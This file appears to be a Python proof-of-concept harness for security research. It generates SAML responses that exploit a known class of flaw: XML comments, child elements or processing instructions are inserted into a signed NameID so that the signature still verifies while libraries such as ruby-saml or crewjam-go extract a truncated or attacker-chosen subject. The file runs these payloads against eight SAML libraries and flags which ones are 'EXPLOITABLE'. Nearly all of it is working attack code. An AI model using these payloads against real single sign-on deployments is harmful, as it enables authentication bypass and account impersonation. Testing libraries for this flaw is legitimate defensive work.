"""PoC: Comment Truncation & Mixed Content Extraction Divergence.

Tests whether inserting XML comments inside signed NameID elements
preserves signature validity while causing extraction divergence
between SAML libraries.

Attack theory:
  exc-c14n (without comments) strips comments before digest computation.
  Therefore: <NameID>admin<!-- -->@company.com</NameID>
  has the SAME digest as <NameID>admin@company.com</NameID>.
  Signature remains VALID, but REXML .text / Go etree.Text()
  return only the first text node ("admin").

Also tests pre-signed mixed content (child elements inside NameID).
"""

from __future__ import annotations

import json
import os
import re
import subprocess
import sys
import tempfile

from lxml import etree

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = os.path.join(SCRIPT_DIR, os.pardir)
TARGETS_DIR = os.path.join(ROOT_DIR, "targets")
FIXTURES_DIR = os.path.join(TARGETS_DIR, "saml_fixtures")

# Add parent to path for generate_saml_seeds
sys.path.insert(0, SCRIPT_DIR)
from generate_saml_seeds import (
    _build_response,
    _load_key_and_cert,
    _sign_assertion,
    _to_xml,
    SAML_NS,
    DS_NS,
)

# Runtime paths
PYTHON = sys.executable
RUBY = r"C:\Ruby32-x64\bin\ruby.exe"
NODE = "node"


def _find_php():
    """Find PHP executable."""
    import glob
    candidates = glob.glob(
        r"C:\Users\dmbs3\AppData\Local\Microsoft\WinGet\Packages\PHP.PHP.8.3*\php.exe"
    )
    return candidates[0] if candidates else "php"


PHP = _find_php()


# ── Target runners ──

def run_target(name: str, xml_bytes: bytes) -> dict | None:
    """Run a target wrapper and parse JSON output."""
    go_exe = os.path.join(TARGETS_DIR, "saml_crewjam", "saml_crewjam.exe")
    runners = {
        "signxml": [PYTHON, os.path.join(TARGETS_DIR, "saml_signxml.py")],
        "python3-saml": [PYTHON, os.path.join(TARGETS_DIR, "saml_python3saml.py")],
        "xml-crypto": [NODE, os.path.join(TARGETS_DIR, "saml_xmlcrypto.js")],
        "node-saml": [NODE, os.path.join(TARGETS_DIR, "saml_nodesaml.js")],
        "samlify": [NODE, os.path.join(TARGETS_DIR, "saml_samlify.js")],
        "ruby-saml": [RUBY, os.path.join(TARGETS_DIR, "saml_rubysaml.rb")],
        "php-saml": [PHP, os.path.join(TARGETS_DIR, "saml_phpsaml.php")],
        "crewjam-go": [go_exe],
    }

    if name not in runners:
        return None

    with tempfile.NamedTemporaryFile(suffix=".xml", delete=False, mode="wb") as f:
        f.write(xml_bytes)
        tmp_path = f.name

    try:
        result = subprocess.run(
            runners[name] + [tmp_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            timeout=10,
        )
        if result.returncode == 0 and result.stdout.strip():
            return json.loads(result.stdout.strip())
        return None
    except Exception as e:
        print(f"  [{name}] ERROR: {e}")
        return None
    finally:
        os.unlink(tmp_path)


# ── Attack generators ──

def generate_comment_truncation(key_pem: bytes, cert_pem: bytes) -> list[tuple[str, bytes]]:
    """Generate comment truncation attack payloads.

    These insert XML comments into a validly-signed NameID.
    exc-c14n(without comments) strips comments → digest unchanged → sig VALID.
    But REXML .text returns only the first text node before the comment.
    """
    attacks = []

    # Base: sign a normal response with admin@company.com
    resp = _build_response(
        nameid="admin@company.com",
        response_id="_resp_poc1",
        assertion_id="_assert_poc1",
    )
    resp = _sign_assertion(resp, key_pem, cert_pem)
    base_xml = _to_xml(resp)
    base_str = base_xml.decode("utf-8")

    # Verify baseline is valid
    attacks.append(("baseline_valid", base_xml))

    # Attack 1: Comment splits email at @ sign
    # admin<!-- -->@company.com  →  .text = "admin", textContent = "admin@company.com"
    a1 = base_str.replace(
        "admin@company.com</saml:NameID>",
        "admin<!-- -->@company.com</saml:NameID>",
    )
    attacks.append(("comment_at_sign", a1.encode("utf-8")))

    # Attack 2: Comment after first char
    # a<!-- -->dmin@company.com  →  .text = "a"
    a2 = base_str.replace(
        "admin@company.com</saml:NameID>",
        "a<!-- -->dmin@company.com</saml:NameID>",
    )
    attacks.append(("comment_after_first_char", a2.encode("utf-8")))

    # Attack 3: Empty comment to split entirely
    # <!-- -->admin@company.com  →  .text = "" (empty first text node before comment)
    # Actually, no text node before comment → .text might be nil
    a3 = base_str.replace(
        ">admin@company.com</saml:NameID>",
        "><!-- -->admin@company.com</saml:NameID>",
    )
    attacks.append(("comment_at_start", a3.encode("utf-8")))

    # Attack 4: Multiple comments
    # adm<!-- -->in@com<!-- -->pany.com  →  .text = "adm"
    a4 = base_str.replace(
        "admin@company.com</saml:NameID>",
        "adm<!-- -->in@com<!-- -->pany.com</saml:NameID>",
    )
    attacks.append(("comment_multiple", a4.encode("utf-8")))

    # Attack 5: Comment with content (shouldn't matter for c14n)
    a5 = base_str.replace(
        "admin@company.com</saml:NameID>",
        "admin<!--INJECTED-->@company.com</saml:NameID>",
    )
    attacks.append(("comment_with_content", a5.encode("utf-8")))

    # Attack 6: Comment right before closing tag
    # admin@company.com<!-- -->  →  .text = "admin@company.com" (no difference)
    # This is the control case — should show no divergence
    a6 = base_str.replace(
        "admin@company.com</saml:NameID>",
        "admin@company.com<!-- --></saml:NameID>",
    )
    attacks.append(("comment_at_end_control", a6.encode("utf-8")))

    return attacks


def generate_mixed_content_signed(key_pem: bytes, cert_pem: bytes) -> list[tuple[str, bytes]]:
    """Generate pre-signed mixed content payloads.

    These have child elements inside NameID BEFORE signing,
    so the signature covers the adversarial content.
    REXML .text / Go .Text() return only the first text node.
    """
    attacks = []

    # We need to manually construct the assertion with mixed NameID content
    # because _build_response sets name_id.text which is a simple text node

    # Attack 1: evil prefix + child element with legit suffix
    resp = _build_response(
        nameid="placeholder",  # will be replaced
        response_id="_resp_mc1",
        assertion_id="_assert_mc1",
    )
    # Find the NameID element and modify its content
    assertion = resp.find(f"{{{SAML_NS}}}Assertion")
    name_id = assertion.find(f".//{{{SAML_NS}}}NameID")
    name_id.text = "evil@attacker.com"
    child = etree.SubElement(name_id, "x")
    child.text = "admin@company.com"
    # Now sign this — the digest will cover "evil@attacker.com<x>admin@company.com</x>"
    resp = _sign_assertion(resp, key_pem, cert_pem)
    attacks.append(("mixed_evil_prefix", _to_xml(resp)))

    # Attack 2: legit prefix + evil child
    resp2 = _build_response(
        nameid="placeholder",
        response_id="_resp_mc2",
        assertion_id="_assert_mc2",
    )
    assertion2 = resp2.find(f"{{{SAML_NS}}}Assertion")
    name_id2 = assertion2.find(f".//{{{SAML_NS}}}NameID")
    name_id2.text = "admin@company.com"
    child2 = etree.SubElement(name_id2, "injected")
    child2.text = "evil@attacker.com"
    resp2 = _sign_assertion(resp2, key_pem, cert_pem)
    attacks.append(("mixed_legit_prefix", _to_xml(resp2)))

    # Attack 3: PI (processing instruction) splitting
    # <NameID>evil<?pi real@user.com?></NameID>
    # PIs are NOT stripped by exc-c14n, so this changes the digest
    # But let's test anyway — sign it as-is
    resp3 = _build_response(
        nameid="placeholder",
        response_id="_resp_mc3",
        assertion_id="_assert_mc3",
    )
    assertion3 = resp3.find(f"{{{SAML_NS}}}Assertion")
    name_id3 = assertion3.find(f".//{{{SAML_NS}}}NameID")
    name_id3.text = "evil@attacker.com"
    pi = etree.ProcessingInstruction("x", "admin@company.com")
    name_id3.append(pi)
    resp3 = _sign_assertion(resp3, key_pem, cert_pem)
    attacks.append(("mixed_pi", _to_xml(resp3)))

    # Attack 4: Nested SAML element
    resp4 = _build_response(
        nameid="placeholder",
        response_id="_resp_mc4",
        assertion_id="_assert_mc4",
    )
    assertion4 = resp4.find(f"{{{SAML_NS}}}Assertion")
    name_id4 = assertion4.find(f".//{{{SAML_NS}}}NameID")
    name_id4.text = "admin"
    ext = etree.SubElement(name_id4, f"{{{SAML_NS}}}Extension")
    ext.text = "@company.com"
    resp4 = _sign_assertion(resp4, key_pem, cert_pem)
    attacks.append(("mixed_saml_extension", _to_xml(resp4)))

    return attacks


# ── Main ──

def main():
    print("=" * 70)
    print("PoC: Comment Truncation & Mixed Content Extraction Divergence")
    print("=" * 70)

    key_pem, cert_pem = _load_key_and_cert()

    targets = ["signxml", "python3-saml", "xml-crypto", "node-saml",
               "samlify", "ruby-saml", "php-saml", "crewjam-go"]

    # ── Test 1: Comment Truncation ──
    print("\n" + "=" * 70)
    print("TEST 1: Comment Truncation Attack")
    print("Theory: exc-c14n strips comments → digest unchanged → sig VALID")
    print("But REXML .text returns only first text node")
    print("=" * 70)

    comment_attacks = generate_comment_truncation(key_pem, cert_pem)

    for attack_name, xml_bytes in comment_attacks:
        print(f"\n--- {attack_name} ---")
        # Show the NameID content
        nameid_match = re.search(
            rb'<saml:NameID[^>]*>(.*?)</saml:NameID>',
            xml_bytes, re.DOTALL
        )
        if nameid_match:
            print(f"  NameID content: {nameid_match.group(1).decode('utf-8', errors='replace')}")

        results = {}
        for target in targets:
            r = run_target(target, xml_bytes)
            if r:
                results[target] = {
                    "sig": r.get("signature_valid", False),
                    "subject": r.get("subject"),
                    "assertion_id": r.get("assertion_id"),
                }

        # Display results
        sig_true = [t for t, r in results.items() if r["sig"]]
        sig_false = [t for t, r in results.items() if not r["sig"]]
        subjects = {t: r["subject"] for t, r in results.items()}
        unique_subjects = set(s for s in subjects.values() if s)

        print(f"  sig=TRUE:  {', '.join(sig_true) if sig_true else 'NONE'}")
        print(f"  sig=FALSE: {', '.join(sig_false) if sig_false else 'NONE'}")
        print(f"  Subjects:")
        for t, s in sorted(subjects.items()):
            marker = " <<<" if s and len(unique_subjects) > 1 and s != "admin@company.com" else ""
            print(f"    {t:15s}: {s!r}{marker}")

        if len(unique_subjects) > 1 and sig_true:
            print(f"\n  *** DIVERGENCE DETECTED with valid signature! ***")
            print(f"  *** Unique subjects: {unique_subjects} ***")
            divergent_with_sig = [t for t in sig_true if subjects.get(t) != "admin@company.com"]
            if divergent_with_sig:
                print(f"  *** EXPLOITABLE: {divergent_with_sig} have sig=TRUE but different subject ***")

    # ── Test 2: Pre-signed Mixed Content ──
    print("\n" + "=" * 70)
    print("TEST 2: Pre-signed Mixed Content")
    print("Theory: Sign NameID with child elements → .text returns first node only")
    print("=" * 70)

    mixed_attacks = generate_mixed_content_signed(key_pem, cert_pem)

    for attack_name, xml_bytes in mixed_attacks:
        print(f"\n--- {attack_name} ---")
        nameid_match = re.search(
            rb'<saml:NameID[^>]*>(.*?)</saml:NameID>',
            xml_bytes, re.DOTALL
        )
        if nameid_match:
            print(f"  NameID content: {nameid_match.group(1).decode('utf-8', errors='replace')}")

        results = {}
        for target in targets:
            r = run_target(target, xml_bytes)
            if r:
                results[target] = {
                    "sig": r.get("signature_valid", False),
                    "subject": r.get("subject"),
                    "assertion_id": r.get("assertion_id"),
                }

        sig_true = [t for t, r in results.items() if r["sig"]]
        sig_false = [t for t, r in results.items() if not r["sig"]]
        subjects = {t: r["subject"] for t, r in results.items()}
        unique_subjects = set(s for s in subjects.values() if s)

        print(f"  sig=TRUE:  {', '.join(sig_true) if sig_true else 'NONE'}")
        print(f"  sig=FALSE: {', '.join(sig_false) if sig_false else 'NONE'}")
        print(f"  Subjects:")
        for t, s in sorted(subjects.items()):
            print(f"    {t:15s}: {s!r}")

        if len(unique_subjects) > 1:
            print(f"\n  *** DIVERGENCE DETECTED! ***")
            print(f"  *** Unique subjects: {unique_subjects} ***")
            if sig_true:
                divergent_sigs = {t: subjects[t] for t in sig_true}
                print(f"  *** With valid sig: {divergent_sigs} ***")

    # ── Summary ──
    print("\n" + "=" * 70)
    print("SUMMARY")
    print("=" * 70)
    print("Comment truncation exploits exc-c14n(without comments) to preserve")
    print("signature validity while causing text extraction divergence.")
    print("If any target shows sig=TRUE with truncated subject, it's exploitable.")


if __name__ == "__main__":
    main()
